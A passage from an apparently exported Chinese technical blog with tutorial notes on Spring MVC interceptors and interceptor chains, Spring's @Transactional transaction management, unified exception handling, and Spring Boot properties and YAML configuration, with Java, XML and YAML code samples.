<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tyt.controller.interceptor;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 若基于注解开发，需要加 @Component 注解，否则不需要</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProjectInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	* 访问Controller某个方法之前执行</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> request 可以在方法请求进来之前更改request中的属性值</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> response</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> handler 封装了当前处理方法的信息，可对其进行反射操作</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@return</span> true 后续调用链是否执行; false 则中断后续执行</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;preHandle...&quot;</span>);</span><br><span class="line">		<span class="comment">// PreHandle方法若返回的false表示不放行，整个流程处于被拦截状态。</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	* 视图被渲染之前（Controller方法调用之后）调用</span></span><br><span class="line"><span class="comment">	* preHandle方法处理之后这个方法会被调用，如果控制器Controller出现了异常，则不会执行此方法</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> response 可以在方法执行后去更改response中的信息</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> handler  封装了当前处理方法的信息</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> modelAndView 封装了model和view,所以当请求结束后可以修改model中的数据或者新增model数据,也可以修改view的跳转</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@throws</span> Exception9</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;postHandle...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	* 如果preHandle返回false则不会执行该方法</span></span><br><span class="line"><span class="comment">	* 在视图渲染之后执行，相当于try catch finally 中finally，出现异常也一定会执行该方法</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> response</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> handler</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> ex</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;afterCompletion...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><code>preHandle</code>：预处理回调方法，实现处理器的预处理（如登录检查），第三个参数为响应的处理器返回值：true表示继续流程（如调用下一个拦截器或处理器）；false表示流程中断（如登录检查失败），不会继续调用其他的拦截器或处理器，此时我们需要通过response来产生响应；</li>
<li><code>postHandle</code>：后处理回调方法，实现处理器的后处理（但在渲染视图之前），此时我们可以通过modelAndView（模型和视图对象）对模型数据进行处理或对视图进行处理，modelAndView也可能为null。</li>
<li><code>afterCompletion</code>：整个请求处理完毕回调方法，即在视图渲染完毕时回调，如性能监控中我们可以在此记录结束时间并输出消耗时间，还可以进行一些资源清理，类似于try-catch-finally中的finally，但仅调用处理器执行链中preHandle返回true的拦截器才会执行。</li>
</ul>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154528.png"></p>
<p><strong>② 配置拦截器</strong></p>
<ul>
<li><strong>基于XML配置</strong></li>
</ul>
<p>在Spring核心配置文件中配置拦截器</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  配置拦截器  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--  指定对哪些资源进行拦截操作  --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/**&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.controller.interceptor&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li><p><strong>基于注解开发</strong></p>
<p>​	</p>
<p><strong>有两种方法</strong></p>
</li>
</ul>
<p><strong>方法①</strong> ：可定义一个类继承<code>WebMvcConfigurationSupport </code> 类并注册拦截器，之后SpringMvc核心配置类配置包扫描至该类所在包。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tyt.config;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringMvcSupport</span> <span class="keyword">extends</span> <span class="title class_">WebMvcConfigurationSupport</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> ProjectInterceptor projectInterceptor;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">		<span class="comment">// 添加拦截器并设定拦截的访问路径，路劲可以通过可变参数设置多个</span></span><br><span class="line">		registry.addInterceptor(projectInterceptor).addPathPatterns(<span class="string">&quot;/book&quot;</span>, <span class="string">&quot;/book/*&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> &#123;</span><br><span class="line">		<span class="comment">// 添加对静态资源的访问</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ComponentScan(&#123;&quot;com.tyt.controller&quot;, &quot;com.tyt.config&quot;&#125;)</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringMvcConfig</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>方法②</strong> ：直接在SpringMVC核心配置类实现<code>WebMvcConfigurer</code> 接口并注册拦截器（此方法较方法①更加简化，当侵入式较强）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ComponentScan(&#123;&quot;com.tyt.controller&quot;&#125;)</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringMvcConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> ProjectInterceptor projectInterceptor;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span>&#123;</span><br><span class="line">		<span class="comment">// 添加对静态资源的访问</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">		<span class="comment">// 添加拦截器并设定拦截的访问路径，路劲可以通过可变参数设置多个</span></span><br><span class="line">		registry.addInterceptor(projectInterceptor).addPathPatterns(<span class="string">&quot;/book&quot;</span>, <span class="string">&quot;/book/*&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="三、拦截器链"><a href="#三、拦截器链" class="headerlink" title="三、拦截器链"></a>三、拦截器链</h1><blockquote>
<ul>
<li>当配置多个拦截器时，形成拦截器链</li>
<li>拦截器链的运行顺序参照拦截器添加顺序为准</li>
<li>当拦截器中出现对原始处理的拦截，后面的拦截器均终止运行</li>
<li>当拦截器运行中断，仅运行配置在前面的拦截器的<code>afterCompletion</code>操作</li>
</ul>
</blockquote>
<p><strong>假设现在有拦截器1、2、3</strong>，分别用pre1、post1、after1；pre2、post2、after2；pre3、post3、after3来描述各拦截器方法。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154528.png"></p>
<p><strong>① 三个拦截器的preHandle均返回true</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154528.png"></p>
<hr>
<p><strong>② 拦截器3的preHandle返回false</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154528.png"></p>
<hr>
<p><strong>③ 拦截器2的preHandle返回false</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154528.png"></p>
<hr>
<p><strong>④ 拦截器1的preHandle返回false</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154528.png"></p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring事务管理</title>
    <url>/posts/1bdcf24b.html</url>
    <content><![CDATA[<h1 id="一、Spring事务简介"><a href="#一、Spring事务简介" class="headerlink" title="一、Spring事务简介"></a>一、Spring事务简介</h1><ul>
<li>事务作用：在数据层保障一系列的数据库操作同成功同失败</li>
<li>Spring事务作用：在数据层或业务层保障一系列的数据库操作同成功同失败</li>
</ul>
<h1 id="二、案例引入"><a href="#二、案例引入" class="headerlink" title="二、案例引入"></a>二、案例引入</h1><p><strong>模拟银行账户间转账业务</strong></p>
<blockquote>
<ul>
<li><strong>需求</strong>：实现任意两个账户间转账操作 </li>
<li><strong>需求微缩</strong>：A账户减钱，B账户加钱</li>
</ul>
</blockquote>
<p><strong>数据库如下：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<hr>
<p><strong>dao层接口如下：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<hr>
<p><strong>service层的实现如下</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<hr>
<p><strong>我们来测试一波</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<p><strong>数据库的内容也更改了，确实达到了我们的预期，目前看来是没有任何问题的</strong></p>
<hr>
<p><strong>但是我们现在在 transfer 转账操作之间人为添加一句bug</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<hr>
<p><strong>再运行一次，这次就出问题了</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<p><strong>程序只执行了转出操作，就遇到了异常，转入操作为未执行。这就导致了数据库中只记录到了转出的信息。</strong></p>
<blockquote>
<p><strong>结果分析：</strong><br>① 程序正常执行时，账户金额 A减B加，没有问题<br>② 程序出现异常后，转移失败，但是异常之前操作成功，异常之后操作失败，整体业务失败</p>
</blockquote>
<hr>
<h1 id="三、Spring事务管理开启步骤"><a href="#三、Spring事务管理开启步骤" class="headerlink" title="三、Spring事务管理开启步骤"></a>三、Spring事务管理开启步骤</h1><p><strong>① 在业务层接口上添加 Spring 事务管理 <code>@Transactional</code></strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"><br><code>注意</code>：Spring注解式事务通常添加在业务层接口中而不会添加到业务层实现类中，降低耦合；注解式事务可以添加到业务方法上表示当前方法开启事务，也可以添加到接口上表示当前接口所有方法开启事务。</p>
<hr>
<p><strong>② 设置事务管理器</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<p><strong>我此处共设置了 3 个配置类，我将事务管理器配置在了 JdbcConfig 中</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<p><code>注意</code>：事务管理器要根据实现技术进行选择；Mybatis框架使用的是 JDBC 事务</p>
<hr>
<p><strong>③ 开启注解式事务驱动 <code>@EnableTransactionManagement</code></strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<hr>
<p><strong>此时我们再对刚才有异常的程序再执行一次。</strong></p>
<ul>
<li><strong>我们先将数据库归为原样</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<ul>
<li><strong>再进行测试</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
<p><strong>程序异常，但数据库的信息未改动</strong></p>
<hr>
<h1 id="四、事务属性"><a href="#四、事务属性" class="headerlink" title="四、事务属性"></a>四、事务属性</h1><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154414.png"></p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringMVC异常处理器</title>
    <url>/posts/92a4644d.html</url>
    <content><![CDATA[<ul>
<li><p>程序开发过程中不可避免的会遇到异常现象</p>
</li>
<li><p>所有的异常均抛出到表现层进行处理</p>
</li>
<li><p>表现层处理异常，若每个方法单独书写会导致代码量巨大，可使用 <a href="https://blog.csdn.net/qq_51938362/article/details/125822524?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22125822524%22,%22source%22:%22qq_51938362%22%7D&ctrtid=NAerp">AOP</a> 思想解决</p>
</li>
<li><p>异常处理器</p>
<p>  集中的、统一的处理项目中出现的异常</p>
<p>  <img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154308.png"></p>
</li>
</ul>
<h1 id="异常处理开发步骤"><a href="#异常处理开发步骤" class="headerlink" title="异常处理开发步骤"></a>异常处理开发步骤</h1><p><strong>① 新建异常处理类，并在类上标注注解 <code>@ControllerAdvice</code> （若为 RESTful风格则使用 <code>@RestControllerAdvice</code>）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProjectExceptionAdvice</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>② 在异常处理类中编写方法处理异常并标注注解 <code>@ExceptionHandler</code></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProjectExceptionAdvice</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 标注该方法处理什么种类的异常</span></span><br><span class="line">	<span class="meta">@ExceptionHandler(Exception.class)</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doException</span><span class="params">(Exception ex)</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;出现异常了...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<p><strong>③ 在 Spring 配置类中扫描异常处理器所在包</strong></p>
<p>因为我将我的异常处理类放在 controller 包下，所以我直接扫描 controller 包</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154308.png"></p>
<hr>
<h1 id="项目异常处理方案"><a href="#项目异常处理方案" class="headerlink" title="项目异常处理方案"></a>项目异常处理方案</h1><ul>
<li><strong>项目异常分类</strong></li>
</ul>
<blockquote>
<p><strong>① 业务异常（BusinessException）：</strong> </p>
<ul>
<li>规范的用户行为产生的异常</li>
<li>不规范的用户行为操作产生的异常</li>
</ul>
<p><strong><code>解决：</code></strong></p>
<ul>
<li>发送对应消息传递给用户，提醒规范操作</li>
</ul>
<hr>
<p><strong>② 系统异常（SystemException）：</strong></p>
<ul>
<li>项目运行过程中可预计且无法避免的异常</li>
</ul>
<h2 id="解决：-发送固定消息传递给用户，安抚用户-发送特定消息给运维人员，提醒维护-记录日志"><a href="#解决：-发送固定消息传递给用户，安抚用户-发送特定消息给运维人员，提醒维护-记录日志" class="headerlink" title="解决：- 发送固定消息传递给用户，安抚用户- 发送特定消息给运维人员，提醒维护- 记录日志"></a><strong><code>解决：</code></strong><br>- 发送固定消息传递给用户，安抚用户<br>- 发送特定消息给运维人员，提醒维护<br>- 记录日志</h2><p><strong>③ 其他异常（Exception）：</strong></p>
<ul>
<li>编程人员未预期到的异常</li>
</ul>
<p><strong><code>解决：</code></strong></p>
<ul>
<li>发送固定消息传递给用户，安抚用户</li>
<li>发送特定消息给编程人员，提醒维护（纳入预期范围内）</li>
<li>记录日志</li>
</ul>
</blockquote>
<hr>
<h2 id="自定义异常类"><a href="#自定义异常类" class="headerlink" title="自定义异常类"></a>自定义异常类</h2><p><strong>自定义异常类继承 RuntimeException，并实现所有的构造方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BusinessException</span> <span class="keyword">extends</span> <span class="title class_">RuntimeException</span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Integer code;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">BusinessException</span><span class="params">(Integer code, String message)</span> &#123;</span><br><span class="line">		<span class="built_in">super</span>(message);</span><br><span class="line">		<span class="built_in">this</span>.code = code;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">BusinessException</span><span class="params">(Integer code, String message, Throwable cause)</span> &#123;</span><br><span class="line">		<span class="built_in">super</span>(message, cause);</span><br><span class="line">		<span class="built_in">this</span>.code = code;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> Integer <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> code;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCode</span><span class="params">(Integer code)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.code = code;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot配置文件</title>
    <url>/posts/6abf1536.html</url>
    <content><![CDATA[<h1 id="一、配置文件简介"><a href="#一、配置文件简介" class="headerlink" title="一、配置文件简介"></a>一、配置文件简介</h1><p><strong>整个项目中所有重要的数据都是在配置文件中配置的，比如：</strong><br>① 数据库的连接信息<br>② 项目的启动端口<br>③ 第三方系统的调用密钥等信息<br>④ 用于发现和定位问题的普通日志和异常日志<br>…</p>
<ul>
<li><strong>SpringBoot项目是一个标准的Maven项目，它的配置文件需要放在src&#x2F;main&#x2F;resources&#x2F;下，其文件名必须为<code>application</code>，其存在两种文件形式，分别是properties、yaml（或yml）文件。</strong></li>
</ul>
<hr>
<h1 id="二、properties-配置文件说明"><a href="#二、properties-配置文件说明" class="headerlink" title="二、properties 配置文件说明"></a>二、properties 配置文件说明</h1><ul>
<li>properties 是早期的配置文件的格式，也是 Spring Boot 项目创建后默认的配置文件格式。</li>
<li>properties 以键值对的形式配置的，key 和 value 之间用 <code>=</code> 号连接。key 就是要配置的属性，value 就是要设置的值。</li>
</ul>
<p><strong>示例代码：</strong></p>
<p><strong>application.<code>properties</code></strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置端口号</span></span><br><span class="line"><span class="string">server.port</span> <span class="string">=</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置数据库连接信息</span></span><br><span class="line"><span class="string">spring.datasource.url=jdbc:mysql://127.0.0.1:3306/test</span></span><br><span class="line"><span class="string">spring.datasource.username=root</span></span><br><span class="line"><span class="string">spring.datasource.password=****</span></span><br></pre></td></tr></table></figure>
<h2 id="1-properties数据读取"><a href="#1-properties数据读取" class="headerlink" title="1. properties数据读取"></a>1. properties数据读取</h2><p>可以使用 <code>@Value</code> 注解来读取 properties 配置文件的配置内容。<br>读取方式：在注入类中创建相关属性，在该属性上使用 <code>@Value</code> 注解，具体使用方式为 <code>@Value(value = &quot;$&#123;配置文件中属性名&#125;&quot;)</code> 或 <code>@Value(&quot;$&#123;配置文件中属性名&#125;&quot;)</code>。</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadProperties</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Value(value = &quot;$&#123;server.port&#125;&quot;)</span></span><br><span class="line">	<span class="keyword">private</span> Integer port;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Value(&quot;$&#123;spring.datasource.url&#125;&quot;)</span></span><br><span class="line">	<span class="keyword">private</span> String url;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping(&quot;/port&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> Integer <span class="title function_">getPort</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> port;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping(&quot;/url&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getUrl</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> url;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="2-多环境开发配置"><a href="#2-多环境开发配置" class="headerlink" title="2. 多环境开发配置"></a>2. 多环境开发配置</h2><p><strong>新建文件 <code>application-环境名.properties</code>，在该文件配置该环境所需信息；<br>在<code>application.properties</code>设置启用环境。</strong></p>
<p><strong>示例：</strong></p>
<ul>
<li><strong>建立文件<code>application-dev.properties</code>，并做出相应配置</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153920.png"></p>
<ul>
<li><strong>在 application.properties 中设置启用环境</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153920.png"></p>
<h1 id="三、yaml-配置文件说明"><a href="#三、yaml-配置文件说明" class="headerlink" title="三、yaml 配置文件说明"></a>三、yaml 配置文件说明</h1><ul>
<li>YAML（YAML Ain’t a Markup Language）是一种可读性高、易于理解、用于表达数据序列化的格式</li>
<li>优点：<br>① 容易阅读<br>② 容易与脚本语言交互<br>③ 以数据为核心，重视数据轻格式</li>
<li>yaml 文件拓展名<br>① <code>.yml</code>（主流），是 yaml 的缩写<br>② <code>.yaml</code></li>
</ul>
<h2 id="1-yaml-语法规则"><a href="#1-yaml-语法规则" class="headerlink" title="1. yaml 语法规则"></a>1. yaml 语法规则</h2><ul>
<li>大小写敏感</li>
<li>属性层次关系使用多行描述，每行结尾使用 <code>:</code>结束</li>
<li>使用缩进表示层次关系，同层级左侧对齐，只允许使用空格（不允许会用 Tab 键）</li>
<li>属性值前面添加空格（属性名与属性值之间使用 <code>冒号 + 空格</code> 作为分割）</li>
<li><code>#</code> 表示注释</li>
</ul>
<p><strong>示例代码：</strong></p>
<p><strong>application.<code>yml</code></strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置项目的端口号</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 配置数据库连接的信息</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://127.0.0.1:3306/test</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">****</span></span><br></pre></td></tr></table></figure>

<h2 id="2-yml-配置各数据类型数据"><a href="#2-yml-配置各数据类型数据" class="headerlink" title="2. yml 配置各数据类型数据"></a>2. yml 配置各数据类型数据</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 整型</span></span><br><span class="line"><span class="attr">value:</span> <span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 布尔类型</span></span><br><span class="line"><span class="attr">boolean.value:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串</span></span><br><span class="line"><span class="attr">string:</span></span><br><span class="line">  <span class="attr">value1:</span> <span class="string">hello</span> <span class="string">\n</span> <span class="string">aaa</span></span><br><span class="line">  <span class="attr">value2:</span> <span class="string">&#x27;hello \n bbb&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># NULL</span></span><br><span class="line"><span class="attr">null.value:</span> <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对象</span></span><br><span class="line"><span class="attr">enterprise:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">tyt</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">18</span></span><br><span class="line">  <span class="attr">tel:</span> <span class="number">11111</span></span><br><span class="line">  <span class="comment"># 集合</span></span><br><span class="line">  <span class="attr">subject:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Java</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">前端</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">大数据</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="3-yaml数据读取方式"><a href="#3-yaml数据读取方式" class="headerlink" title="3. yaml数据读取方式"></a>3. yaml数据读取方式</h2><h3 id="1-注解-Value直接获取"><a href="#1-注解-Value直接获取" class="headerlink" title="1. 注解@Value直接获取"></a>1. 注解@Value直接获取</h3><p><strong>通过 <code>@Value</code> 注解来读取配置中的简单数据类型和 null</strong></p>
<p><strong>示例代码：</strong></p>
